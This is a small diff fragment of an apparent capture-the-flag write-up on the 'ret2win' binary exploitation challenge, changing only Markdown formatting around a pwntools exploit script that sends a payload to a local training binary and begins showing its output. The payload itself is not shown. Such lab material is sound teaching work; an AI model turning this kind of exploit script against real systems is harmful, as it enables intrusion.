@@ -224,7 +224,7 @@ p = process('./ret2win')
 p.sendline(payload) 
 p.interactive()
 ```
-- Let's run the exploit.
+Let's run the exploit.
 ```
 $ python exploit.py 
 [+] Starting local process './ret2win': pid 26803
